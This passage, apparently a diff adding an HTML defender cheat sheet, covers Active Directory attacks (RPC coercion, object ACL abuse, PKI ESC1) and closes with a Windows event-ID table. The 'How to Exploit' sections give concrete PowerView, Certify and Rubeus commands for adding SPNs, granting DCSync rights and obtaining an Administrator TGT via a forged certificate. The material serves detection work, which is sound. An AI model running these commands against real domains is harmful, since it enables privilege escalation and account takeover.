+      <p>No native Windows event for RPC coercing. Best options: host firewall logs showing DC outbound connections to attacker on port 445/139 — inbound connects followed by outbound to non-DC IP is the coerce pattern. Block outbound 139/445 from DCs to non-DC hosts. Third-party: RPC Firewall (Zero Networks) for granular RPC function monitoring. Unexpected TGT logons at UD servers from DC computer accounts.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Coercer</span><span class="tool-chip">PetitPotam</span><span class="tool-chip">Rubeus monitor</span><span class="tool-chip">Mimikatz</span>
+  </div>
+</div>
+
+<!-- ── 12. OBJECT ACLs ── -->
+<div class="attack-card" id="acls">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">12</span>
+    <span class="attack-title">Object ACL Abuse</span>
+    <span class="badge badge-acl">ACL ABUSE</span>
+    <span class="mitre-tag">T1222.001</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>Misconfigured ACEs on AD objects granting low-privileged users elevated rights: <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteDACL</code>, <code>WriteOwner</code>, <code>ForceChangePassword</code>, <code>AddMember</code>. Common paths: user can write SPN (→ Kerberoast any account), user can reset another account's password, user has GenericAll on a group (→ add themselves). BloodHound maps these attack paths graphically.</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Enumerate: SharpHound + BloodHound (<code>-c All</code>); PowerView <code>Get-DomainObjectACL</code></li>
+        <li>Add SPN to target: <code>Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/SPN'}</code></li>
+        <li>Reset password: <code>Set-ADAccountPassword</code> (if ForceChangePassword)</li>
+        <li>Add to group: <code>Add-DomainGroupMember</code></li>
+        <li>WriteDACL: grant yourself DCSync rights, then DCSync</li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p>Object modified: <span class="event-id">4738</span> (user changed) — does not show which attribute. <span class="event-id">4724</span> if ACL abuse leads to password reset. <span class="event-id">4742</span> for computer object changes. Alert on non-admin accounts modifying objects. Naming convention baseline: changes by accounts outside admin naming patterns = suspicious. Honeypot: ACL-misconfigured object that no one should touch.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">BloodHound</span><span class="tool-chip">SharpHound</span><span class="tool-chip">PowerView</span><span class="tool-chip">Impacket dacledit</span>
+  </div>
+</div>
+
+<!-- ── 13. PKI ESC1 ── -->
+<div class="attack-card" id="esc1">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">13</span>
+    <span class="attack-title">PKI Misconfiguration — ESC1</span>
+    <span class="badge badge-pki">PKI</span>
+    <span class="mitre-tag">T1649</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>ESC1 (from SpecterOps "Certified Pre-Owned"): an enrollable certificate template with <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> set, Client Authentication EKU, and no manager approval. Allows any low-privileged user to request a certificate for any UPN (e.g., <code>Administrator@domain</code>), then use that cert for Kerberos auth (PKINIT) to get a TGT as that user. Certificates are valid 1+ years and remain valid through password resets.</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Find vulnerable templates: <code>Certify.exe find /vulnerable</code></li>
+        <li>Request cert for DA: <code>Certify.exe request /ca:CA /template:VulnTemplate /altname:Administrator</code></li>
+        <li>Convert to PFX: <code>openssl pkcs12 -in cert.pem -keyex -CSP "..." -export</code></li>
+        <li>Get TGT: <code>Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx</code></li>
+        <li>Enumerate via: <code>certipy find -u user@domain -p pass -dc-ip DC</code></li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p>Events on the CA server (not DC): <span class="event-id">4886</span> (certificate requested) and <span class="event-id">4887</span> (certificate issued). These alone don't reveal the SAN — inspect the cert itself or use <code>certutil -view</code> to find SAN fields on issued certs. Alert on <span class="event-id">4768</span> with certificate authentication (PKINIT) where the requestor differs from their normal logon pattern. Automate: parse CA-issued certs for SAN != Subject mismatches.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Certify</span><span class="tool-chip">Certipy</span><span class="tool-chip">Rubeus</span><span class="tool-chip">certutil</span>
+    <span class="footer-label" style="margin-left:12px">NOTE:</span>
+    <span style="font-size:11px;color:var(--yellow);font-family:'Courier New',monospace">Events 4886/4887 log to CA, not DC</span>
+  </div>
+</div>
+
+<!-- ── Cheat sheet summary table ── -->
+<div class="section-divider">Event ID Cheat Sheet</div>
+
+<div style="overflow-x:auto;">
+<table style="width:100%;border-collapse:collapse;font-family:'Courier New',monospace;font-size:12px;">
+  <thead>
+    <tr style="background:var(--surface);color:var(--muted);text-transform:uppercase;letter-spacing:0.08em;font-size:10px;">
+      <th style="padding:10px 12px;text-align:left;border-bottom:1px solid var(--border)">Event ID</th>
+      <th style="padding:10px 12px;text-align:left;border-bottom:1px solid var(--border)">Description</th>
+      <th style="padding:10px 12px;text-align:left;border-bottom:1px solid var(--border)">Source Log</th>
+      <th style="padding:10px 12px;text-align:left;border-bottom:1px solid var(--border)">Relevant Attacks</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid var(--border)">
+      <td style="padding:8px 12px"><span class="event-id">4624</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Successful logon</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security</td>
+      <td style="padding:8px 12px;color:var(--text)">Golden Ticket, KCD, Shares, Obj Props, NTLM Relay</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);background:rgba(255,255,255,0.02)">
+      <td style="padding:8px 12px"><span class="event-id">4625</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Failed logon</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security</td>
+      <td style="padding:8px 12px;color:var(--text)">Honeypot creds, GPP, Shares, Obj Props</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border)">
+      <td style="padding:8px 12px"><span class="event-id">4662</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Operation performed on AD object</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security (DC)</td>
+      <td style="padding:8px 12px;color:var(--text)">DCSync (GUIDs: 1131f6aa / 1131f6ad)</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);background:rgba(255,255,255,0.02)">
+      <td style="padding:8px 12px"><span class="event-id">4663</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Object access attempt</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security</td>
+      <td style="padding:8px 12px;color:var(--text)">GPP XML file read</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border)">
+      <td style="padding:8px 12px"><span class="event-id">4675</span></td>
+      <td style="padding:8px 12px;color:var(--text)">SIDs filtered</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security (DC)</td>
+      <td style="padding:8px 12px;color:var(--text)">Golden Ticket cross-domain escalation</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);background:rgba(255,255,255,0.02)">
+      <td style="padding:8px 12px"><span class="event-id">4724</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Password reset attempt</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security</td>
+      <td style="padding:8px 12px;color:var(--text)">ACL abuse (ForceChangePassword)</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border)">
+      <td style="padding:8px 12px"><span class="event-id">4738</span></td>
+      <td style="padding:8px 12px;color:var(--text)">User account changed</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security</td>
+      <td style="padding:8px 12px;color:var(--text)">ACL abuse (SPN add, attribute changes)</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);background:rgba(255,255,255,0.02)">
+      <td style="padding:8px 12px"><span class="event-id">4742</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Computer account changed</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security</td>
+      <td style="padding:8px 12px;color:var(--text)">ACL abuse on computer objects</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border)">
+      <td style="padding:8px 12px"><span class="event-id">4768</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Kerberos TGT requested (AS-REQ)</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security (DC)</td>
+      <td style="padding:8px 12px;color:var(--text)">AS-REProasting (PreAuth=0), GPP, ESC1 (PKINIT)</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);background:rgba(255,255,255,0.02)">
+      <td style="padding:8px 12px"><span class="event-id">4769</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Kerberos TGS requested</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security (DC)</td>
+      <td style="padding:8px 12px;color:var(--text)">Kerberoasting (RC4 downgrade, bulk requests)</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border)">
+      <td style="padding:8px 12px"><span class="event-id">4771</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Kerberos pre-auth failed</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security (DC)</td>
+      <td style="padding:8px 12px;color:var(--text)">Honeypot creds — bad password attempt</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);background:rgba(255,255,255,0.02)">
+      <td style="padding:8px 12px"><span class="event-id">4776</span></td>
+      <td style="padding:8px 12px;color:var(--text)">NTLM auth validation attempt</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security (DC)</td>
+      <td style="padding:8px 12px;color:var(--text)">Honeypot creds, NTLM relay detection</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border)">
+      <td style="padding:8px 12px"><span class="event-id">4886</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Certificate requested</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security (CA server)</td>
+      <td style="padding:8px 12px;color:var(--text)">PKI ESC1, ESC8</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);background:rgba(255,255,255,0.02)">
+      <td style="padding:8px 12px"><span class="event-id">4887</span></td>
+      <td style="padding:8px 12px;color:var(--text)">Certificate issued</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security (CA server)</td>
+      <td style="padding:8px 12px;color:var(--text)">PKI ESC1, ESC8</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border)">
+      <td style="padding:8px 12px"><span class="event-id">5136</span></td>
+      <td style="padding:8px 12px;color:var(--text)">DS object attribute modified</td>
+      <td style="padding:8px 12px;color:var(--muted)">Security (DC)</td>
+      <td style="padding:8px 12px;color:var(--text)">GPO modification (requires DS Changes audit)</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+</main>
+
+<script>
+  function toggle(header) {
+    const card = header.closest('.attack-card');
+    const body = card.querySelector('.card-body');
+    const footer = card.querySelector('.card-footer');
+    const chevron = header.querySelector('.chevron');
+    const isOpen = body.classList.contains('open');
+
+    body.classList.toggle('open', !isOpen);
+    if (footer) footer.classList.toggle('open', !isOpen);
+    chevron.textContent = isOpen ? '▶' : '▼';
+    chevron.style.color = isOpen ? 'var(--muted)' : 'var(--accent)';
+  }
+
+  // Open all on load for immediate visibility, close them
+  // Actually keep closed for quick-reference UX — user clicks what they need
+</script>
+</body>
+</html>
